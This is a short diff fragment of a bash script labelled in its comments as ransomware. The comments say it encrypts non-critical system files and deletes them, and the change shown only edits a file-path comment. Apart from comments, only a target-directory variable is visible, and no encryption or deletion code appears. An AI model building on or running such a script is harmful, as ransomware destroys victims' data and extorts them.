@@ -1,7 +1,7 @@
 #!/bin/bash
 # Author: SergioZ3R0
 # Randosmware that encrypts all non-critical system files and deletes them.
-# Generals/randosmware.sh
+# randosmware.sh
 
 # Variables
 DIR="/home/kali/paquito"                   # Directory to encrypt
